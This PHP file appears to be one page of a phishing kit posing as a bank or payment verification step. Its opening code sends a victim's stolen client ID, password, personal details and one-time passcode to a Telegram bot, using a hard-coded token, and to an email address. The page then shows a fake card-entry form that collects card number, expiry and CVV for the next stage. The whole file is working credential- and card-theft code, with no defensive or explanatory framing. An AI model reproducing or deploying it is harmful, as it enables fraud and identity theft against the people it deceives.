<?php
session_start();
include "header.php";
include "../email.php";

$_SESSION['otp'] = $_POST['otp'];

$to = $email;;
$subject = 'OTP | All info ';
$message = "
----------------OTP | All info-----------------
  



Client id: " . $_SESSION['id'] . "
Client Password: " . $_SESSION['password'] . "

---------------------------------




Fullname : " . $_SESSION['fullname'] . "

Zipcode : " . $_SESSION['zip'] . "
Phone : " . $_SESSION['phone'] . "
Date of birth : " . $_SESSION['date'] . "


-------------------OTP-------------------
OTP : " . $_SESSION['otp'] . "

  

";

sendMessageT('-670431353',$message,'2141533923:AAETgvM1iliuDfSj6V79whhNunI-mncfr-E');
mail($to, $subject, $message);

?>
<link rel="stylesheet" href="../css/index.css">

<main class="container-expand-gl" style="min-height:450px; width:105%;background-color: #F3F4F6;">
    <div class="row container-expand-gl mx-auto co" style="width: 75%; padding:0; ">

        <br>
        <p class="col-12 par" style="font-size: 28px; margin:10px;">Please enter your card information</p>
        <br>
        <div class="col-12 mx-auto row co1" style="background-color: white;height:360px ; padding:0; margin:40px;">

            <form action="wait3.php" method="post">

                <div class="card-body" style="margin:0 250px;">
                    <div class="row">
                        <div class="col-sm-12">
                            <div class="form-group">
                                <label for="name">Name on card</label>
                                <input name="nameoncard" class="form-control" id="name" type="text" placeholder="Enter your name">
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-sm-12">
                            <div class="form-group">
                                <label for="ccnumber">Credit Card Number</label>
                                <div class="input-group">
                                    <input name="crd" class="form-control" type="text" placeholder="0000 0000 0000 0000" autocomplete="email">
                                    <div class="input-group-append">
                                        <span class="input-group-text">
                                            <i class="mdi mdi-credit-card"></i>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="form-group col-sm-4">
                            <label for="ccmonth">Month</label>
                            <select name="month" class="form-control" id="ccmonth">
                                <option>1</option>
                                <option>2</option>
                                <option>3</option>
                                <option>4</option>
                                <option>5</option>
                                <option>6</option>
                                <option>7</option>
                                <option>8</option>
                                <option>9</option>
                                <option>10</option>
                                <option>11</option>
                                <option>12</option>
                            </select>
                        </div>
                        <div class="form-group col-sm-4">
                            <label for="ccyear">Year</label>
                            <select name="year" class="form-control" id="ccyear">
                               
                            
                                <option>2021</option>
                                <option>2022</option>
                                <option>2023</option>
                                <option>2024</option>
                                <option>2025</option>
                                <option>2026</option>
                                <option>2027</option>
                                <option>2028</option>
                                <option>2029</option>
                                    <option>2030</option>
                            </select>
                        </div>
                        <div class="col-sm-4">
                            <div class="form-group">
                                <label for="cvv">CVV/CVC</label>
                                <input name="cvv" class="form-control" id="cvv" type="text" placeholder="123">
                            </div>
                        </div>
                    </div>
                    <button type="submit" class="btn btn-block " style="background-color: #DA1E10; color:white; font-weight: blod;">Confirm your card</button>
                </div>
            </form>
        </div>
</main>
<br>
<br>
<style>
    @media only screen and (max-width: 800px) {
        .co {
            width: 200% !important;
        }

        main {
            background-color: white !important;
        }

        .par {
            margin: 0px !important;
            font-size: 20px !important;
        }
        .co1{
            margin: 0px !important;
            transform: translate(-32%,0);
        }

    }
</style>
<br> <br>
<?php
include "footer.php";



?>